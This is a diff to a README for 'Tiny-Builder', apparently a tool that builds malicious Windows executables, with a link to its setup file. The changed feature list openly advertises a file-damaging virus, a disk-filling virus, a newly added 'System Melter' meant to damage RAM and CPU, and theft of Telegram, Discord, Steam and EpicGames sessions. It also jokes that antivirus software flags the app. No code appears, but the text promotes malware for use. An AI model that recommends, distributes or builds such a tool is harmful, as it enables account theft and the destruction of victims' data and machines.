@@ -11,7 +11,7 @@
 
 > [!NOTE]
 > Just Run [Tiny-Builder-setup.exe](https://github.com/Abolfazl2687/Tiny-Builder/releases/) and Enjoy !! 
->  & Unti-Viruses Are Not Friendly With This App ;)
+>  & Unti-Viruses May Be Not Friendly With This App ;)
 
 ### Features
 
@@ -23,7 +23,8 @@ Creating 'exe' Apps For amd64 / x86 Windows Systems The Apps Are ;
 4. Gathering Files With One Or More Format YOU Want Like .pdf , .txt , .docx & ..... (YOU Can Choose More Than One Format)
 5. File Damager Virus (rename all files in dir you choose to random big numbers without any file format)
 6. No Free Space Virus (Make Biggest File To Get Your Free Space)
-7. Telegram-Desktop Session Stealing
-8. Discord Session Stealing
-9. Steam Session Stealing
-10. EpicGames Session Stealing
+7. System Melter Virus (Damage RAM & CPU)
+8. Telegram-Desktop Session Stealing
+9. Discord Session Stealing
+10. Steam Session Stealing
+11. EpicGames Session Stealing
